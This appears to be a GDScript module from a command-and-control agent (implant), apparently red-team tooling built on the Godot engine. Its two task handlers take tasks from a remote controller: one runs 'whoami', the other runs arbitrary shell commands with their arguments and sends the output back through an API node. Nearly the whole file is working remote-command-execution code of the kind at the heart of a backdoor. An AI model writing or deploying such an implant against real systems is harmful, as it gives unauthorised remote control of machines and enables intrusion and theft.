extends Node

var api

func _ready():
	api = $".".get_parent().get_node("api")

func _on_tasking_whoami(task):

	if task.has("command") and task.get("command") == "whoami":
		var output = []

		var exit_code = OS.execute("whoami", [], true, output, true)

		print("")
		print(exit_code)
		print(output)
		print("")

		api.agent_response(
			api.create_task_response(
				exit_code == 0,
				true,
				task.get("id"),
				output,
				[
					[
						"Process Create",
						"/usr/bin/whoami"
					]
				]
			)
		)

	else:
		print("bad whoami task: ", task)
		# TODO: agent_response in failure cases


func _on_tasking_shell(task):
	# {command:shell, id:4bca52fb-2e65-48bb-86cb-83bbf9b3872f, parameters:{"command": "ls", "arguments": ["-alht"]}, timestamp:1646101624.903044}

	if task.has("command") and task.get("command") == "shell" and task.has("parameters"):
		var parameters = parse_json(task.get("parameters"))
		var command = parameters.get("command")
		var arguments = parameters.get("arguments")
		var output = []
		print("executing the following command and arguments")
		print(command)
		print(arguments)
		print("")
		var exit_code = OS.execute(command, arguments, true, output, true)

		print("")
		print(exit_code)
		print(output)
		print("")

		api.agent_response(
			api.create_task_response(
				exit_code == 0,
				true,
				task.get("id"),
				output,
				[
					[
						"Process Create",
						command + " " + PoolStringArray(arguments).join(" ")
					]
				]
			)
		)

	else:
		print("bad shell task: ", task)
		# TODO: agent_response in failure cases
